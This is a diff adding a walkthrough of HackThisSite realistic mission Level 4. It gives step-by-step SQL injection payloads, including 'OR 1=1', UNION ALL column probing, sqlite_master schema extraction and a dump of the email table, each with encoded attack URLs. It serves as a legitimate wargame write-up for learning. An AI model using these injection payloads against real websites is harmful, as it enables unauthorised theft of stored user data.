@@ -149,3 +149,50 @@ On the page we see a note "Poems will be stored online immediately but will not 
 Using `index.html` as the name doesn't work, but they're proably stored in a subdirectory, so `../index.html` does indeed work!
 The last piece is we need to copy the source code of the `oldindex.html` page into the body that is written to the new `index.html`.
 
+#### Level 4: Fischer's Animal Products
+The first thing we see on the page is an input form for an email, so this seems like a good place to start trying injection attacks.
+However, it seems anything that doesn't match a valid email format is rejected with the message `Error inserting into table "email"!`
+While this means the input it sanitized so we can't inject via this vector, it does give us the hint that we have an SQL database.
+Going to either of the links given sends us to a products pages, and we notice the difference between them is the URL parameters, perhaps this could be an input vector for injection?
+
+We'll need to URL encode our inputs, but we can first try a simple inejction to get all products:
+
+```SQL
+1 OR 1=1
+```
+
+<https://www.hackthissite.org/missions/realistic/4/products.php?category=1%20OR%201%3D1>
+
+This works. Now tested other injections, if we have invalid syntax it simply returns a broken page. So we can attempt a UNION attack to extract the database.
+We can determine the number of parameters easily enough, by unioning with the `email` table we know exists from earlier. We can also see where in the output page the data ends up.
+
+```SQL
+1 OR 1=1 UNION ALL SELECT 1,2,3,4 FROM email
+```
+
+We can see the 1 ends up in the image `src` url, the 2 ends up in the product description, and 3 ends up in the product price, not sure about 4`.
+From here we can try use the UNION attack to extract information about the database. For a hacking challenge it's a far guess that it's an SQLite instance, and indeed we can extract the database schemat like so:
+
+```SQL
+1 OR 1=1 UNION ALL SELECT NULL,sql,NULL,NULL FROM sqlite_master
+```
+
+<https://www.hackthissite.org/missions/realistic/4/products.php?category=1%20OR%201%3D1%20UNION%20ALL%20SELECT%20NULL%2Csql%2CNULL%2CNULL%20FROM%20sqlite_master>
+
+Which tells us:
+
+```SQL
+CREATE TABLE products (id int(11), text text, price text, category int(11))
+CREATE TABLE email (email text)
+```
+
+We can finish off easily by dumping the `email` table:
+
+```SQL
+1 OR 1=1 UNION ALL SELECT NULL,email,NULL,NULL FROM email
+```
+
+<https://www.hackthissite.org/missions/realistic/4/products.php?category=1%20OR%201%3D1%20UNION%20ALL%20SELECT%20NULL%2Cemail%2CNULL%2CNULL%20FROM%20email>
+
+After which we just need to copy the emails, and send them as a DM to the user `SaveTheWhales` after doing so the level will be complete.
+
